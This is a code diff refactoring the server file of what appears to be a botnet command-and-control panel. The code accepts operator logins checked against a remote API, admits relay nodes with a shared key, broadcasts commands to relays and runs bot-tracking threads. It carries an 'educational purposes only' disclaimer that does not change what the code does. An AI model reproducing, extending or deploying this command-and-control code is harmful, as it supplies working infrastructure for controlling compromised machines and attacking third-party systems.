@@ -13,13 +13,14 @@ from requests import (
 )
 from colorama import Fore, init as colorama_init
 from modules.config import C2Config, Relay
-from modules.loops import Loops
+from modules.core import Core
 from modules.client import Client
 
 __filename__ = "cnc"
 __legit__ = "I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
 
 config: C2Config = C2Config(True)
+core: Core = Core(config=config)
 config.setbanner("""
             dMMMMb     dMP dMP    dMP dMP     dMMMMb    .aMMMb  dMMMMMMP
            dMP.dMP    dMP dMP    dMP.dMP     dMP"dMP   dMP"dMP    dMP
@@ -30,33 +31,6 @@ config.setbanner("""
                     C                N                C
 """)
 
-def log(
-    data: str,
-) -> None: 
-    if config.debug: print(data)
-
-def send(
-    s: Sock,
-    data: str,
-    escape=True,
-    reset=True,
-) -> None:
-    if reset: data += config.COLOR_RESET
-    if escape: data += '\r\n'
-
-    s.send(data.encode())
-
-def broadcast(
-    data: str,
-) -> None:
-    log(f"send {data}")
-
-    for relay in config.relays_sock.keys():
-        try: send(relay, f'{data}', False, False)
-        except Exception:
-            config.relays_sock.pop(relay)
-            relay.close()
-
 def find_login(
     username: str,
     password: str,
@@ -64,22 +38,21 @@ def find_login(
     password: str = hashlib.sha256(password.encode()).hexdigest()
 
     url: str = f"{config.API_URL}/login?urlkey={config.URL_KEY}&username={username}&password={password}"
-    log(f"\n\n{url}\n\n\n\n")
+    core.log(f"\n\n{url}\n\n\n\n")
 
     res: Response = rget(url, timeout=5000)
 
     return res.status_code == 200
 
-
 def handle_client(
     client: Sock,
     address: tuple[str, int],
-    loops: Loops,
+    loops: Core,
 ) -> None:
     # trying to get username
     while 1:
-        send(client, config.ANSI_CLEAR, False)
-        send(client, f'{config.COLOR_WHITE}Username > ', False)
+        loops.send(client, config.ANSI_CLEAR, False)
+        loops.send(client, f'{config.COLOR_WHITE}Username > ', False)
         username = client.recv(1024).decode().strip()
         if not username:
             continue
@@ -88,8 +61,8 @@ def handle_client(
     # sending password request to client
     password = ''
     while 1:
-        send(client, config.ANSI_CLEAR, False)
-        send(client, f'{config.COLOR_WHITE}Password > {Fore.BLACK} ', False, False)
+        loops.send(client, config.ANSI_CLEAR, False)
+        loops.send(client, f'{config.COLOR_WHITE}Password > {Fore.BLACK} ', False, False)
 
         while not password.strip():
             password = client.recv(1024).decode('cp1252').strip()
@@ -98,15 +71,15 @@ def handle_client(
 
     # if this is a client and not a relay
     if password != config.RELAY_KEY:
-        send(client, config.ANSI_CLEAR, False)
+        loops.send(client, config.ANSI_CLEAR, False)
 
         if not find_login(username, password):
-            send(client, 'Invalid credentials!')
+            loops.send(client, 'Invalid credentials!')
             time.sleep(1)
             client.close()
             return
 
-        client_loops: Client = Client(config=config)
+        client_loops: Client = Client(core=core, config=config)
 
         Thread(target=client_loops.update_title, args=[client, username]).start()
         Thread(target=client_loops.command_line, args=[client, username]).start()
@@ -136,12 +109,12 @@ def main() -> None:
     if len(argv) != 2:
         if config.cnc_addr.CNC_PORT != None : port = config.cnc_addr.CNC_PORT
         else:
-            log(f'Usage: py {argv[0]} <cnc port>')
+            core.log(f'Usage: py {argv[0]} <cnc port>')
             exit()
 
     port = int(argv[1])
     if port < 1 or port > 65535:
-        log('invalid cnc port')
+        core.log('invalid cnc port')
         exit()
 
     colorama_init(convert=True)
@@ -153,23 +126,21 @@ def main() -> None:
     try: s.bind(('0.0.0.0', port))
 
     except Exception:
-        log('Failed to bind port')
+        core.log('Failed to bind port')
         exit()
-
-    loops: Loops = Loops(config=config)
 
     if  (status:=rget(f"{config.API_URL}/version?urlkey={config.URL_KEY}").status_code) == 200: pass
     else:
-        log(f'Failed to connect to api (status={status})')
+        core.log(f'Failed to connect to api (status={status})')
         exit()
 
     s.listen()
 
-    Thread(target=loops.ping).start()
-    Thread(target=loops.net).start()
-    Thread(target=loops.getbot).start()
+    Thread(target=core.ping).start()
+    Thread(target=core.net).start()
+    Thread(target=core.getbot).start()
 
-    while 1: Thread(target=handle_client, args=[*s.accept(), loops]).start()
+    while 1: Thread(target=handle_client, args=[*s.accept(), core]).start()
 
 if __name__ == '__main__':
     print(f"\nLegit: {__legit__}\n")
